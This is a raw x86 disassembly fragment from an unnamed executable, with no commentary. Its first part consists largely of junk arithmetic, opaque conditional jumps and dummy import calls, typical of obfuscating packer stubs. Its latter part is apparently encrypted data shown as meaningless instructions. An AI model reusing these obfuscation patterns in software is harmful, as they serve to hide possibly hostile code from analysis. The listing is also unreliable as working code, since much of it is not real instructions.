  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x428481
  41b47a:	cmp    DWORD PTR ds:0x428565,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x4282f3
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428361
  41b4a9:	sbb    ecx,DWORD PTR ds:0x428451
  41b4af:	mov    DWORD PTR ds:0x428361,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428571
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428471
  41b4c3:	or     DWORD PTR ds:0x4284e5,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x428411
  41b4d4:	or     DWORD PTR ds:0x428419,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42857d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428571,ebx
  41b4ee:	mov    DWORD PTR ds:0x42841d,ecx
  41b4f4:	mov    DWORD PTR ds:0x4284ed,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428371,0x7065
  41b509:	cmp    DWORD PTR ds:0x42857d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428575
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428469
  41b541:	or     ecx,DWORD PTR ds:0x42842d
  41b547:	mov    DWORD PTR ds:0x428469,ecx
  41b54d:	add    DWORD PTR ds:0x428409,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x428351,0x591d
  41b563:	dec    DWORD PTR ds:0x428481
  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42857d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428361,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428369,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42857d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x42842d
  41b5b3:	sbb    DWORD PTR ds:0x428451,0x4277
  41b5bd:	and    DWORD PTR ds:0x4284d5,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428475,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x42844d,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428369,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x428501,0x0
  41b613:	mov    DWORD PTR ds:0x428365,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x42854d,0x6434
  41b627:	mov    DWORD PTR ds:0x4284d5,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x428445,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428361
  41b643:	cmp    DWORD PTR ds:0x428501,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x42842d
  41b655:	push   0x428469
  41b65a:	push   0x428405
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x4284e5,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x428341
  41b672:	sub    ecx,DWORD PTR ds:0x428449
  41b678:	mov    DWORD PTR ds:0x428341,ecx
  41b67e:	adc    DWORD PTR ds:0x428441,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x428441
  41b690:	or     DWORD PTR ds:0x4284e5,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x4284c1
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428469,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x42842d,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428565,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x428429,0x428479
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x428425
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x428501
  41b6f5:	sub    DWORD PTR ds:0x428571,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428475,0x0
  41b719:	mov    DWORD PTR ds:0x428359,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x428439
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x4284d5,edi
  41b737:	cmp    DWORD PTR ds:0x428475,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x428157
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x42834d
  41b756:	xor    DWORD PTR ds:0x428331,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x4284dd
  41b76e:	xor    ecx,DWORD PTR ds:0x4284e5
  41b774:	mov    DWORD PTR ds:0x4284dd,ecx
  41b77a:	and    DWORD PTR ds:0x42835d,0x34b7
  41b784:	adc    DWORD PTR ds:0x428501,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428361,0x0
  41b7c2:	mov    DWORD PTR ds:0x428469,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42857d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x428355,edx
  41b7d9:	cmp    DWORD PTR ds:0x428361,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x428351
  41b80a:	sbb    DWORD PTR ds:0x428459,edx
  41b810:	or     edx,DWORD PTR ds:0x428371
  41b816:	and    edx,DWORD PTR ds:0x4284d5
  41b81c:	sub    edx,DWORD PTR ds:0x428569
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42846d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x42851d
  41b839:	mov    ecx,DWORD PTR ds:0x428529
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x428429,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x428481,0x0
  41b879:	mov    DWORD PTR ds:0x428375,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x428501,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x4284dd,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x428481,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x42854d,edx
  41b8c2:	add    DWORD PTR ds:0x428571,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428565
  41b8ce:	and    DWORD PTR ds:0x4284cd,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428469,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x428415
  41b8f9:	or     edx,DWORD PTR ds:0x428461
  41b8ff:	mov    DWORD PTR ds:0x428415,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x4284d5,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x4284d5,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x42833d,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x428451,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x4284f1,0x428481
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428375,0x0
  41b996:	mov    DWORD PTR ds:0x428359,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x42842d
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428469,ebx
  41b9b6:	mov    DWORD PTR ds:0x428439,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428375,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x4284cd
  41b9d5:	push   0x4281b5
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x42855d,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x4284e5,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x42835d
  41b9f5:	adc    DWORD PTR ds:0x428449,ecx
  41b9fb:	add    DWORD PTR ds:0x428351,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x428355,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x42834d,0x0
  41ba21:	mov    DWORD PTR ds:0x428445,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x42844d,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x42834d,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x428419,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x428545
  41ba6a:	sbb    DWORD PTR ds:0x428421,0x4284fd
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428465
  41ba80:	adc    ecx,DWORD PTR ds:0x428579
  41ba86:	mov    DWORD PTR ds:0x428465,ecx
  41ba8c:	adc    DWORD PTR ds:0x428569,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428369,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428575,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428469,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x428419,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x428431
  41bada:	mov    DWORD PTR ds:0x428455,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x428455,0x133b
  41baf3:	cmp    DWORD PTR ds:0x428419,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428561
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x42842d,0x4030
  41bb1f:	sub    DWORD PTR ds:0x4284d9,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x428415
  41bb31:	xor    DWORD PTR ds:0x428411,ecx
  41bb37:	sbb    DWORD PTR ds:0x42855d,edx
  41bb3d:	cmp    DWORD PTR ds:0x428571,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428575
  41bb4a:	mov    ecx,DWORD PTR ds:0x4284f1
  41bb50:	mov    DWORD PTR ds:0x42846d,edx
  41bb56:	mov    DWORD PTR ds:0x428425,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428571,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x428295
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x4284c9,edi
  41bb90:	neg    DWORD PTR ds:0x428355
  41bb96:	movzx  ecx,WORD PTR ds:0x428559
  41bb9d:	sbb    DWORD PTR ds:0x428471,ecx
  41bba3:	or     DWORD PTR ds:0x428445,0x428451
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x428351,0x0
  41bbb9:	mov    DWORD PTR ds:0x428451,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x42844d
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x428351,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42827f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428371
  41bbfe:	adc    DWORD PTR ds:0x428365,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x42844d
  41bc10:	adc    DWORD PTR ds:0x428579,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x42833d
  41bc1c:	sub    DWORD PTR ds:0x428581,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428579,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x42832d,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x4284d1,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428579,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x4284cd,edi
  41bc85:	cmp    DWORD PTR ds:0x4284d1,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x4282f3
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x428455
  41bca6:	movzx  ecx,BYTE PTR ds:0x428479
  41bcad:	add    DWORD PTR ds:0x428365,ecx
  41bcb3:	sub    DWORD PTR ds:0x4284d5,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x428409
  41bcc1:	or     DWORD PTR ds:0x428549,ecx
  41bcc7:	add    DWORD PTR ds:0x428411,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428565,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x428459,0x0
  41bd09:	mov    DWORD PTR ds:0x428545,0x1421
  41bd13:	mov    DWORD PTR ds:0x428481,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x428435
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x42844d,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x428459,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x4284d5
  41bd52:	sub    DWORD PTR ds:0x428361,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x428431
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428461
  41bd64:	mov    DWORD PTR ds:0x428431,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x42834d
  41bd71:	or     DWORD PTR ds:0x4284c5,ecx
  41bd77:	sbb    DWORD PTR ds:0x428345,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x428355
  41bd85:	xor    ecx,DWORD PTR ds:0x428409
  41bd8b:	mov    DWORD PTR ds:0x428355,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x4284e9,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x42842d,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x428555
  41bdc7:	sub    ecx,DWORD PTR ds:0x4284c9
  41bdcd:	mov    DWORD PTR ds:0x428555,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428475,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x428411,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x4284dd
  41be1c:	sbb    eax,DWORD PTR ds:0x428475
  41be22:	mov    ds:0x4284dd,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x428411
  41be39:	xor    ecx,DWORD PTR ds:0x428471
  41be3f:	mov    DWORD PTR ds:0x428411,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x428559,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x4284c5,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42836d,0x428361
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x4284e1,0x0
  41be82:	mov    DWORD PTR ds:0x428411,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428579
  41be93:	mov    DWORD PTR ds:0x428555,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x42833d,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x4284e1,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x4284cd
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x428431
  41becc:	sub    DWORD PTR ds:0x428365,ecx
  41bed2:	and    DWORD PTR ds:0x428439,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428569
  41bee0:	xor    DWORD PTR ds:0x428405,ecx
  41bee6:	or     DWORD PTR ds:0x428445,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x428449
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x4284e1,0x428579
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x428359
  41bf19:	and    ecx,DWORD PTR ds:0x42855d
  41bf1f:	mov    DWORD PTR ds:0x428359,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428369
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8-0x3b3e131],bh
  41bf48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf49:	aam    0x3b
  41bf4b:	sar    BYTE PTR [esi-0x41413bb6],0x97
  41bf52:	mov    edi,0x640993af
  41bf57:	push   edi
  41bf58:	sbb    esi,DWORD PTR [ecx]
  41bf5a:	pop    ss
  41bf5b:	mov    eax,cs
  41bf5d:	les    ebp,FWORD PTR [ecx+0xaee21c5]
  41bf63:	fidivr WORD PTR [eax-0x5c61f9ff]
  41bf69:	fadd   DWORD PTR [edi-0xf040c20]
  41bf6f:	(bad)  
  41bf70:	jae    0x41bfaf
  41bf72:	dec    ebx
  41bf73:	xor    esi,DWORD PTR [edx]
  41bf75:	(bad)  
  41bf76:	push   ebx
  41bf77:	or     BYTE PTR [ecx],bh
  41bf79:	inc    ecx
  41bf7a:	stos   DWORD PTR es:[edi],eax
  41bf7b:	mov    al,0x99
  41bf7d:	dec    edi
  41bf7e:	bound  edi,QWORD PTR [edi+ecx*8+0xd65ab9f]
  41bf85:	pop    ds
  41bf86:	sahf   
  41bf87:	dec    ecx
  41bf88:	clc    
  41bf89:	clc    
  41bf8a:	outs   dx,BYTE PTR ds:[esi]
  41bf8b:	stc    
  41bf8c:	sub    al,0x36
  41bf8e:	enter  0xbd61,0xae
  41bf92:	inc    eax
  41bf93:	xchg   ebp,eax
  41bf94:	or     dh,BYTE PTR [eax]
  41bf96:	dec    esp
  41bf97:	jne    0x41c00e
  41bf99:	xchg   edi,eax
  41bf9a:	in     al,0xf2
  41bf9c:	cmp    al,0x44
  41bf9e:	mov    eax,ds:0x9435764a
  41bfa3:	scas   eax,DWORD PTR es:[edi]
  41bfa4:	inc    esi
  41bfa5:	idiv   BYTE PTR [esi]
  41bfa7:	xchg   edx,eax
  41bfa8:	loope  0x41bf4a
  41bfaa:	pop    eax
  41bfab:	mov    ah,0xca
  41bfae:	into   
  41bfaf:	hlt    
  41bfb0:	in     eax,0x7
  41bfb2:	inc    ebx
  41bfb3:	or     BYTE PTR [ebx+0x4],bl
  41bfb6:	xchg   esp,eax
  41bfb7:	enter  0x760c,0x47
  41bfbb:	mov    ch,0xae
  41bfbd:	out    0x7,eax
  41bfbf:	xchg   BYTE PTR [ecx-0x5bbe34fc],bh
  41bfc5:	mov    edi,0x27a64b9c
  41bfca:	xlat   BYTE PTR ds:[ebx]
  41bfcb:	aam    0x70
  41bfcd:	sbb    al,0xd9
  41bfcf:	or     eax,0x4705e800
  41bfd4:	jecxz  0x41bfab
  41bfd6:	lea    ebp,[eax-0x28]
  41bfd9:	and    BYTE PTR [edx-0xdf7e2d9],0x26
  41bfe0:	fst    DWORD PTR [edi]
  41bfe2:	fld    TBYTE PTR [edx-0x1f41e820]
  41bfe8:	pusha  
  41bfe9:	xchg   esp,eax
  41bfea:	sbb    DWORD PTR [ecx-0x6fbd494c],0xfffffff4
  41bff1:	hlt    
  41bff2:	sbb    al,0xad
  41bff4:	sbb    DWORD PTR [ecx+0x2c],edx
  41bff7:	mov    ch,0xb1
  41bff9:	and    DWORD PTR [edx],ebp
  41bffb:	test   BYTE PTR [ecx-0x76c6c7f9],dl
  41c001:	cdq    
  41c002:	lods   al,BYTE PTR ds:[esi]
  41c003:	into   
  41c004:	outs   dx,BYTE PTR ds:[esi]
  41c005:	test   eax,0xd880b16
  41c00a:	or     esp,DWORD PTR [eax]
  41c00c:	mov    BYTE PTR [esi],ch
  41c00e:	test   al,0xc
  41c010:	out    dx,eax
  41c011:	in     eax,dx
  41c012:	loopne 0x41bfe5
  41c014:	sbb    ah,0xb9
  41c017:	xor    al,al
  41c019:	adc    dl,BYTE PTR ds:0x51d5685a
  41c01f:	gs aas 
  41c021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c022:	jge    0x41c006
  41c024:	inc    edx
  41c025:	sbb    eax,0x869af8c
  41c02a:	push   esp
  41c02b:	test   al,0x29
  41c02d:	mov    esi,0x2e8dc1c1
  41c032:	cmp    al,0x5d
  41c034:	pusha  
  41c035:	jg     0x41c05d
  41c037:	mov    esi,0x404a237
  41c03c:	jo     0x41c009
  41c03e:	mov    ah,0x91
  41c040:	and    dh,BYTE PTR [ebx+ebp*8+0x71462a5f]
  41c047:	inc    ecx
  41c048:	jle    0x41c020
  41c04a:	clc    
  41c04b:	cmp    al,0xb2
  41c04d:	jne    0x41c0c4
  41c04f:	mov    ecx,0xdf617157
  41c054:	mov    edx,0xf9823bb7
  41c059:	imul   eax,DWORD PTR [ecx],0xfa5b18fd
  41c05f:	aam    0x79
  41c061:	mov    bh,0x9c
  41c063:	(bad)  
  41c064:	pop    ebx
  41c065:	mov    edx,0x1085525
  41c06a:	mov    ebp,0xa0f25cf2
  41c06f:	cld    
  41c070:	pushf  
  41c071:	add    bl,cl
  41c073:	rol    ah,1
  41c075:	inc    ebx
  41c076:	xor    DWORD PTR [esi],edx
  41c078:	out    dx,eax
  41c079:	and    DWORD PTR [bx+0x25],0x7a
  41c07e:	fisttp QWORD PTR [edx+0x6007f0ae]
  41c084:	sbb    dl,BYTE PTR [ebx]
  41c086:	xor    eax,0xc7554c64
  41c08b:	cmp    ebx,esi
  41c08d:	call   0xa21a:0x91680278
  41c094:	mov    bl,0xbf
  41c096:	xchg   edx,eax
  41c097:	pop    eax
  41c098:	popf   
  41c099:	cmp    ah,0xe7
  41c09c:	aas    
  41c09d:	xchg   BYTE PTR [eax],ah
  41c09f:	int    0xff
  41c0a1:	loope  0x41c0da
  41c0a3:	loop   0x41c03c
  41c0a5:	inc    ecx
  41c0a6:	or     dl,BYTE PTR [edi+0x4af04c9]
  41c0ac:	and    al,0xb9
  41c0ae:	xchg   esp,eax
  41c0af:	mov    eax,ds:0x951a1be6
  41c0b4:	aam    0xab
  41c0b6:	inc    ebp
  41c0b7:	out    0xf3,al
  41c0b9:	nop
  41c0ba:	jmp    0x41c051
  41c0bc:	pop    ds
  41c0bd:	xchg   edi,eax
